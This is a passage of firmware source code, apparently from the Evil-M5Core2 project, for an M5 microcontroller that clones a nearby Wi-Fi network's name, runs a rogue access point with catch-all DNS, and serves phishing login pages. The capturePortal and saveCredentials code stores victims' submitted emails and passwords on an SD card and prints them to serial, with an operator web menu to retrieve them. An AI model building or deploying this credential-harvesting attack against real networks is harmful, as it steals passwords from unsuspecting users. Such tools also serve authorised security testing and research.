    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) { // Pression courte (moins de 1 secondes)
            currentListIndex++;
            if (currentListIndex >= numSsid) {
              currentListIndex = 0; 
            }
            showWifiList(); 
        } else { // Pression longue (2 secondes ou plus)
            inMenu = true;
            Serial.println("-------------------");
            Serial.println("SSID " + ssidList[currentListIndex] + " selected");
            Serial.println("-------------------");
            waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
        }
    }
}

  }

void showWifiDetails(int networkIndex) {
if (networkIndex >= 0 && networkIndex < numSsid) {
    M5.Display.clear();
    M5.Display.setTextSize(0);
    int y = 2; 
    int x = 0;

    // SSID
    M5.Display.setCursor(x, y);
    M5.Display.println("SSID:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
    y += 20;

    // Channel
    int channel = WiFi.channel(networkIndex);
    M5.Display.setCursor(x, y);
    M5.Display.println("Channel:" + (channel > 0 ? String(channel) : "N/A"));
    y += 10;

    // Security
    String security = getWifiSecurity(networkIndex);
    M5.Display.setCursor(x, y);
    M5.Display.println("Security:" + (security.length() > 0 ? security : "N/A"));
    y += 10;

    // Signal Strength
    int32_t rssi = WiFi.RSSI(networkIndex);
    M5.Display.setCursor(x, y);
    M5.Display.println("Signal:" + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
    y += 10;

    // MAC Address
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    String macAddress = bssidToString(bssid);
    M5.Display.setCursor(x, y);
    M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "N/A"));
    y += 10;
    
    M5.Display.setCursor(56, 110);
    M5.Display.println("Clone");
   /* M5.Display.setCursor(8, 110);
    M5.Display.println("Back");*/
    
    M5.Display.display();
    Serial.println("------Wifi-Info----");
    Serial.println("SSID: " + ssidList[networkIndex]);
    Serial.println("Channel: " + String(WiFi.channel(networkIndex)));
    Serial.println("Security: " + security);
    Serial.println("Signal: " + String(rssi) + " dBm");
    Serial.println("MAC: " + macAddress);
    Serial.println("-------------------");

    while (!inMenu) {
      M5.update();
      handleDnsRequestSerial();
      if (M5.BtnA.wasPressed()) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        Serial.println(ssidList[networkIndex] + " Cloned...");
        drawMenu(); 
      }
    }
  }
}

String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    if (!isAutoKarmaActive){
       if (captivePortalPassword == ""){
       WiFi.softAP(clonedSSID.c_str());
      }else{
       WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
      }

    }

    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    isCaptivePortalOn = true;
    server.on("/", HTTP_GET, []() {
            String email = server.arg("email");
            String password = server.arg("password");
            if (!email.isEmpty() && !password.isEmpty()) {
                saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
                server.send(200, "text/plain", "Credentials Saved");
            } else {
                Serial.println("-------------------");
                Serial.println("Direct Web Access !!!");
                Serial.println("-------------------");
                servePortalFile(selectedPortalFile);
            }
        });



    server.on("/evil-m5core2-menu", HTTP_GET, []() {
        String html = "<!DOCTYPE html><html><head><style>";
        html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
        html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
        html += " input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
        html += " a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
        html += "</style></head><body>";
        html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
        html += "Password: <input type='password' name='pass'><br>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
        html += "</form></div></body></html>";
        server.send(200, "text/html", html);
        Serial.println("-------------------");
        Serial.println("evil-m5core2-menu access.");
        Serial.println("-------------------");
    });

    server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
        File file = SD.open("/credentials.txt");
        if (file) {
            if (file.size() == 0) {
                server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            } else {
                server.streamFile(file, "text/plain");
            }
            file.close();
        } else {
            server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        }
    } else {
        server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
});

    
    server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
    server.on("/download-sd-file", HTTP_GET, handleFileDownload);
    server.on("/list-directories", HTTP_GET, handleListDirectories);
    
    server.on("/uploadhtmlfile", HTTP_GET, []() {
        if (server.arg("pass") == accessWebPassword) {
            String password = server.arg("pass");
            String html = "<!DOCTYPE html><html><head>";
            html += "<meta charset='UTF-8'>";
            html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
            html += "<title>Upload File</title></head>";
            html += "<body><div class='container'>";
            html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
            html += "<input type='file' name='file' accept='*/*'>";
            html += "Select directory: <select id='dirSelect' name='directory'>";
            html += "<option value='/'>/</option>";
            html += "</select><br>";
            html += "<input type='submit' value='Upload file'>";
            html += "</form>";
            html += "<script>";
            html += "window.onload = function() {";
            html += "    var passValue = '" + password + "';";
            html += "    var dirSelect = document.getElementById('dirSelect');";
            html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
            html += "        .then(response => response.text())";
            html += "        .then(data => {";
            html += "            const dirs = data.split('\\n');";
            html += "            dirs.forEach(dir => {";
            html += "                if (dir.trim() !== '') {";
            html += "                    var option = document.createElement('option');";
            html += "                    option.value = dir;";
            html += "                    option.textContent = dir;";
            html += "                    dirSelect.appendChild(option);";
            html += "                }";
            html += "            });";
            html += "        })";
            html += "        .catch(error => console.error('Error:', error));";
            html += "    var form = document.getElementById('uploadForm');";
            html += "    form.onsubmit = function(event) {";
            html += "        event.preventDefault();";
            html += "        var directory = dirSelect.value;";
            html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
            html += "        form.submit();";
            html += "    };";
            html += "};";
            html += "</script>";
            html += "<style>";
            html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
            html += "</style></body></html>";

            server.send(200, "text/html", html);
        } else {
        server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        }
    });


    
    server.on("/upload", HTTP_POST, []() {
      server.send(200);
    }, handleFileUpload);

    server.on("/delete-sd-file", HTTP_GET, handleFileDelete);
    
    server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);


    server.onNotFound([]() {
        Serial.println("-------------------");
        Serial.println("Portal Web Access !!!");
        Serial.println("-------------------");
        servePortalFile(selectedPortalFile);
    });

    server.begin();
     Serial.println("-------------------");
     Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
     Serial.println("-------------------");
     if (ledOn){
        pixels.setPixelColor(4, pixels.Color(255,0,0)); 
        pixels.setPixelColor(5, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(50); 
        
        pixels.setPixelColor(3, pixels.Color(255,0,0)); 
        pixels.setPixelColor(6, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(50); 

        pixels.setPixelColor(4, pixels.Color(0,0,0));  
        pixels.setPixelColor(5, pixels.Color(0,0,0));
        pixels.show(); 
        delay(50); 
        
        pixels.setPixelColor(2, pixels.Color(255,0,0)); 
        pixels.setPixelColor(7, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(50); 

        pixels.setPixelColor(3, pixels.Color(0,0,0)); 
        pixels.setPixelColor(6, pixels.Color(0,0,0)); 
        pixels.show(); 
        delay(50); 
        
        pixels.setPixelColor(1, pixels.Color(255,0,0)); 
        pixels.setPixelColor(8, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(50);

        pixels.setPixelColor(2, pixels.Color(0,0,0)); 
        pixels.setPixelColor(7, pixels.Color(0,0,0)); 
        pixels.show(); 
        delay(50); 
        
        pixels.setPixelColor(0, pixels.Color(255,0,0)); 
        pixels.setPixelColor(9, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(50); 
        
        pixels.setPixelColor(1, pixels.Color(0,0,0)); 
        pixels.setPixelColor(8, pixels.Color(0,0,0)); 
        pixels.show(); 
        delay(50);
       
        pixels.setPixelColor(0, pixels.Color(0,0,0)); 
        pixels.setPixelColor(9, pixels.Color(0,0,0)); 
        pixels.show(); 
        delay(50); 
        }
      if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
          waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
      }
}


String getDirectoryHtml(File dir, String path, String password) {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
    html += "ul{list-style-type:none;padding:0}";
    html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
    html += "a{color:#007bff;text-decoration:none}";
    html += "a:hover{color:#0056b3}";
    html += ".red{color:red}";
    html += "</style></head><body><ul>";
    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
    }
    
    while (File file = dir.openNextFile()) {
        String fileName = String(file.name());
        String displayFileName = fileName;
        if (path != "/" && fileName.startsWith(path)) {
            displayFileName = fileName.substring(path.length());
            if (displayFileName.startsWith("/")) {
                displayFileName = displayFileName.substring(1);
            }
        }

        String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
        if (!fullPath.startsWith("/")) {
            fullPath = "/" + fullPath;
        }

        if (file.isDirectory()) {
            html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
        } else {
            html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
        }
        file.close();
    }
    html += "</ul>";

    html += "<script>"
            "function confirmDelete(filename) {"
            "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
            "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
            "  }"
            "}"
            "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
            "</script>";

    return html;
}


void handleSdCardBrowse() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }

    String dirPath = server.arg("dir");
    if (dirPath == "") dirPath = "/";

    File dir = SD.open(dirPath);
    if (!dir || !dir.isDirectory()) {
        server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }

    
    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
    html += getDirectoryHtml(dir, dirPath, accessWebPassword);
    server.send(200, "text/html", html);
    dir.close();
}

void handleFileDownload() {
    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        File file = SD.open(fileName, FILE_READ);
        if (file) {
            String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
            server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
            server.streamFile(file, "application/octet-stream");
            file.close();
            return;
        }
    }
    server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
      Serial.println("Unauthorized access attempt");
      server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
      return;
  }

  if (upload.status == UPLOAD_FILE_START) {
      String filename = upload.filename;
      String directory = server.arg("directory");
      
      if (!directory.startsWith("/")) {
          directory = "/" + directory;
      }

      if (!directory.endsWith("/")) {
          directory += "/";
      }

      String fullPath = directory + filename; 

      fsUploadFile = SD.open(fullPath, FILE_WRITE);
      if (!fsUploadFile) {
          Serial.println("Upload start failed: Unable to open file " + fullPath);
          server.send(500, "text/html", "File opening failed");
          return;
      }

      Serial.print("Upload Start: ");
      Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
          size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
          if (written != upload.currentSize) {
              Serial.println("Write Error: Inconsistent data size.");
              fsUploadFile.close();
              server.send(500, "text/html", "File write error");
              return;
          }
      } else {
          if (!fsUploadFile) {
              Serial.println("Error: File is no longer valid for writing.");
          } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
              Serial.println("Error: Data segment size too large.");
              Serial.println(upload.currentSize);
          } else {
              Serial.println("Information: Empty data segment received.");
          }
          return;
      }
  } else if (upload.status == UPLOAD_FILE_END) {
      if (fsUploadFile) {
          fsUploadFile.close();
          Serial.print("Upload End: ");
          Serial.println(upload.totalSize);
          server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          Serial.println("File successfully uploaded");
      } else {
          server.send(500, "text/html", "File closing error");
          Serial.println("File closing error");
      }
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
      server.send(403, "text/plain", "Unauthorized");
      return;
  }

  File root = SD.open("/"); 
  String dirList = "";

  while (File file = root.openNextFile()) {
      if (file.isDirectory()) {
          dirList += String(file.name()) + "\n"; 
      }
      file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String &output) {
  while (File file = dir.openNextFile()) {
      if (file.isDirectory()) {
          output += String(file.name()) + "\n";
          listDirectories(file, String(file.name()), output); 
      }
      file.close();
  }
}


void handleFileDelete() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        return;
    }

    String fileName = server.arg("filename");
    if (!fileName.startsWith("/")) {
        fileName = "/" + fileName;
    }
    if (SD.exists(fileName)) {
        if (SD.remove(fileName)) {
            server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
            Serial.println("-------------------");
            Serial.println("File deleted successfully");
            Serial.println("-------------------");
        } else {
            server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            Serial.println("-------------------");
            Serial.println("File could not be deleted");
            Serial.println("-------------------");
        }
    } else {
        server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        Serial.println("-------------------");
        Serial.println("File not found");
        Serial.println("-------------------");
    }
}

void servePortalFile(const String& filename) {
    
    File webFile = SD.open(filename);
    if (webFile) {
        server.streamFile(webFile, "text/html");
        /*Serial.println("-------------------");
        Serial.println("serve portal.");
        Serial.println("-------------------");*/
        webFile.close();
    } else {
        server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
}

void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
    File file = SD.open("/credentials.txt", FILE_APPEND);
    if (file) {
        file.println("-- Email -- \n" + email);
        file.println("-- Password -- \n" + password);
        file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
        file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
        file.println("------------------");
        file.close();
        Serial.println("-------------------");
        Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
        Serial.println("On Portal Name: " + portalName);
        Serial.println("With Cloned SSID: " + clonedSSID); 
        Serial.println("-------------------");
    } else {
        Serial.println("Error opening file for writing");
    }
}




void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("-------------------");
  Serial.println("Portal Stopped");
  Serial.println("-------------------");
  if (ledOn){
    pixels.setPixelColor(0, pixels.Color(255,0,0)); 
    pixels.setPixelColor(9, pixels.Color(255,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(0, pixels.Color(0,0,0)); 
    pixels.setPixelColor(9, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(1, pixels.Color(255,0,0)); 
    pixels.setPixelColor(8, pixels.Color(255,0,0)); 
    pixels.show(); 
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0,0,0)); 
    pixels.setPixelColor(8, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(2, pixels.Color(255,0,0)); 
    pixels.setPixelColor(7, pixels.Color(255,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(2, pixels.Color(0,0,0)); 
    pixels.setPixelColor(7, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(3, pixels.Color(255,0,0)); 
    pixels.setPixelColor(6, pixels.Color(255,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(3, pixels.Color(0,0,0)); 
    pixels.setPixelColor(6, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(4, pixels.Color(255,0,0)); 
    pixels.setPixelColor(5, pixels.Color(255,0,0)); 
    pixels.show(); 
    delay(50); 

    pixels.setPixelColor(4, pixels.Color(0,0,0));  
    pixels.setPixelColor(5, pixels.Color(0,0,0));
    pixels.show(); 
    delay(50); 
    }
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
    File root = SD.open("/sites");
    numPortalFiles = 0;
    Serial.println("Available portals:");
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".html")) {
                portalFiles[numPortalFiles] = String("/sites/") + fileName;

                Serial.print(numPortalFiles);
                Serial.print(": ");
                Serial.println(fileName);

                numPortalFiles++;
                if (numPortalFiles >= 30) break; // max 30 files
            }
        }
        file.close();
    }
    root.close();
}


void serveChangePasswordPage() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
      return;
  }

  String html = "<html><head><style>";
  html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
  html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
  html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
  html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
  html += "input[type='submit']:hover { background-color: #005F73; }";
  html += "</style></head><body>";
  html += "<form action='/Change-Portal-Password-demand' method='get'>";
  html += "<input type='hidden' name='pass' value='" + password + "'>";
  html += "<h2>Change Portal Password</h2>";
  html += "New Password: <br><input type='password' name='newPassword'><br>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
  server.send(200, "text/html", html);
}



void handleChangePassword() {
  server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          return;
      }
      
      String newPassword = server.arg("newPassword");
      captivePortalPassword = newPassword;
      server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  });

  serveChangePasswordPage();
}



void changePortal() {
    listPortalFiles();
    const int listDisplayLimit = M5.Display.height() / 12;
    bool needDisplayUpdate = true;
    bool buttonPressed = false;
    unsigned long buttonPressTime = 0;

    while (!inMenu) {
        if (needDisplayUpdate) {
            int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

            M5.Display.clear();
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(TFT_WHITE);
            M5.Display.setCursor(10, 10);

            for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
                int lineHeight = 12; // Espacement réduit entre les lignes
                if (i == portalFileIndex) {
                    M5.Display.fillRect(0, (i - listStartIndex) * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
                    M5.Display.setTextColor(TFT_GREEN);
                } else {
                    M5.Display.setTextColor(TFT_WHITE);
                }
                M5.Display.setCursor(10, (i - listStartIndex) * lineHeight);
                M5.Display.println(portalFiles[i].substring(7));
            }
            M5.Display.display();
            needDisplayUpdate = false;
        }

        M5.update();

        if (M5.BtnA.isPressed() && !buttonPressed) {
            buttonPressed = true;
            buttonPressTime = millis();
        }

        if (!M5.BtnA.isPressed() && buttonPressed) {
            unsigned long pressDuration = millis() - buttonPressTime;
            buttonPressed = false;

            if (pressDuration < 1000) { // Appui court
                portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
                needDisplayUpdate = true;
            } else { // Appui long
                selectedPortalFile = portalFiles[portalFileIndex];
                inMenu = true;
                Serial.println("-------------------");
                Serial.println(selectedPortalFile.substring(7) + " portal selected.");
                Serial.println("-------------------");
                waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
            }
        }
    }
}





String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0; 

void readCredentialsFromFile() {
    File file = SD.open("/credentials.txt");
    if (file) {
        numCredentials = 0;
        while (file.available() && numCredentials < 100) {
            credentialsList[numCredentials++] = file.readStringUntil('\n');
        }
        file.close();
    } else {
        Serial.println("Error opening file");
    }
}


void checkCredentials() {
    readCredentialsFromFile();
    if (numCredentials == 0) {
        M5.Display.clear();
        M5.Display.setTextSize(1); // Taille de texte réduite pour l'écran 128x128
        waitAndReturnToMenu("No credentials...");
    } else {
        const int lineHeight = 15; // Hauteur de ligne ajustée pour l'écran 128x128
        const int maxLineLength = 18; // Longueur de ligne maximale adaptée à l'écran 128x128
        const int listDisplayLimit = M5.Display.height() / lineHeight - 2; // Limite d'affichage ajustée

        int totalLines = 0;
        int listStartIndex = 0;
        for (int i = 0; i < numCredentials; i++) {
            int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
            if (i < currentListIndex) {
                listStartIndex += linesNeeded;
            }
            totalLines += linesNeeded;
        }

        int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
        M5.Display.clear();
        M5.Display.setTextSize(1);

        int displayY = 10;
        int currentLine = 0;
        for (int i = 0; i < numCredentials; i++) {
            String credential = credentialsList[i];
            int credentialLength = credential.length();
            int linesNeeded = (credentialLength + maxLineLength - 1) / maxLineLength;

            for (int line = 0; line < linesNeeded; line++) {
                if (currentLine >= listStartIndex && currentLine < listEndIndex) {
                    int startIndex = line * maxLineLength;
                    int endIndex = min(startIndex + maxLineLength, credentialLength);
                    String part = credential.substring(startIndex, endIndex);

                    if (i == currentListIndex) {
                        M5.Display.fillRect(0, displayY, M5.Display.width(), lineHeight, TFT_NAVY);
                        M5.Display.setTextColor(TFT_GREEN);
                    } else {
                        M5.Display.setTextColor(TFT_WHITE);
                    }

                    M5.Display.setCursor(2, displayY + 2);
                    M5.Display.println(part);
                    displayY += lineHeight;
                }
                currentLine++;
            }
            if (currentLine >= listEndIndex) break;
        }
        M5.Display.display();

        while (!inMenu) {
            M5.update();
            handleDnsRequestSerial();

            // Détecter l'appui sur le bouton
            if (M5.BtnA.isPressed() && !buttonPressed) {
                buttonPressed = true;
                buttonPressTime = millis();
            }

            // Détecter le relâchement du bouton
            if (!M5.BtnA.isPressed() && buttonPressed) {
                unsigned long pressDuration = millis() - buttonPressTime;
                buttonPressed = false;

                if (pressDuration < 1000) { // Appui court pour passer au suivant
                    currentListIndex = min(numCredentials - 1, currentListIndex + 1);
                    checkCredentials();
                } else { // Appui long pour revenir au menu
                    inMenu = true;
                    drawMenu();
                    currentListIndex = 0;
                }
            }
        }
    }
}


bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;
  bool buttonPressed = false;
  unsigned long buttonPressTime = 0;

  M5.Display.clear();
  M5.Display.setCursor(12, M5.Display.height() / 2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println(message);
  M5.Display.setCursor(20, 90);
  M5.Display.setTextColor(TFT_GREEN);
  M5.Display.println("Yes: long press");
  M5.Display.setTextColor(TFT_RED);
  M5.Display.setCursor(20, 110);
  M5.Display.println("No: short press");
  M5.Display.setTextColor(TFT_WHITE);

  while (!decisionMade) {
    M5.update();

    if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) { // Appui court
            confirm = false;
            decisionMade = true;
        } else { // Appui long
            confirm = true;
            decisionMade = true;
        }
    }
  }

  return confirm;
}


void deleteCredentials() {
    if (confirmPopup("Delete credentials?")) {
        File file = SD.open("/credentials.txt", FILE_WRITE);
        if (file) {
            file.close();
            Serial.println("-------------------");
            Serial.println("credentials.txt deleted");
            Serial.println("-------------------");
            waitAndReturnToMenu("Deleted successfully");
            Serial.println("Credentials deleted successfully");
        } else {
             Serial.println("-------------------");
            Serial.println("Error deleteting credentials.txt ");
            Serial.println("-------------------");
            waitAndReturnToMenu("Error..");
            Serial.println("Error opening file for deletion");
        }
    } else {
        waitAndReturnToMenu("Deletion cancelled");
    }
}


int countPasswordsInFile() {
    File file = SD.open("/credentials.txt");
    if (!file) {
        Serial.println("Error opening credentials file for reading");
        return 0;
    }

    int passwordCount = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.startsWith("Password:")) {
            passwordCount++;
        }
    }

    file.close();
    return passwordCount;
}


int oldNumClients = -1;
int oldNumPasswords = -1;

void displayMonitorPage1() {
  M5.Display.clear();
  M5.Display.setTextSize(0);
  M5.Display.setTextColor(TFT_WHITE);
  
  M5.Display.setCursor(0, 45);
  M5.Display.println("SSID: " + clonedSSID);
  M5.Display.setCursor(0, 60);
  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  M5.Display.setCursor(0, 75);
  M5.Display.println("Page: " + selectedPortalFile.substring(7));

  oldNumClients = -1;
  oldNumPasswords = -1;

  M5.Display.display();

  while (!inMenu) {
      M5.update();
      handleDnsRequestSerial();
      server.handleClient();

      int newNumClients = WiFi.softAPgetStationNum();
      int newNumPasswords = countPasswordsInFile();

      if (newNumClients != oldNumClients) {
